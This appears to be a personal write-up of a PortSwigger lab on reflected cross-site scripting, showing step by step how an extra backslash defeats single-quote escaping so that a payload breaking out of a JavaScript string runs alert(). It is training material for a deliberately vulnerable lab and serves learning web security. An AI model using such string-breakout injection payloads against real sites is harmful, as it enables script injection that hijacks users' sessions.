---
title: LAB 0.20
aliases:
  - LAB 0.20
tags:
  - XSS
  - Labs
  - Reflected
  - Practitioner
description: "Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"
---
# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

# Solution
---
## Finding the Vulnerability

Start by entering a unique alphanumeric string into the search bar. I used:

```
hi
```

The result page reflects the search term. Right-click on the reflected string and inspect the DOM to see how the input is processed.

You’ll find this inside a `<script>` tag:

```js
var searchTerms = 'hi';
```

![[images/Pasted image 20250223223449.png]]

This indicates the input is assigned to the `searchTerms` variable. Our goal is to break out of this string and inject an `alert()` payload.

---

## Understanding Input Handling

Next, add a single quote to the search term:

```
hi'
```

The result in the DOM is:

```js
var searchTerms = 'hi\'';
```

The server escapes the single quote with a backslash. This tells us that the application is escaping single quotes but not backslashes.

---

## Crafting the Payload

To break out of the string, we need to escape the server’s escaping mechanism. We can do this by providing an extra backslash:

```
M4rdukwasH3re\'
```

This results in:

```js
var searchTerms = 'hi\\'';
```

![[images/Pasted image 20250223223605.png]]

Our backslash escapes the server’s backslash, effectively terminating the string. Now, we can inject our JavaScript code.

---

## Final Payload: Executing the XSS

To execute `alert(1)`. Additionally, we need to comment out the trailing single quote using `//`.

The final payload is:

```
hi\';alert()//
```

This results in:

```js
var searchTerms = 'hi\\';alert()//';
```

![[images/Pasted image 20250223223831.png]]

This breaks out of the string and executes `alert()`, successfully triggering the XSS payload.

![[images/Pasted image 20250223223753.png]]
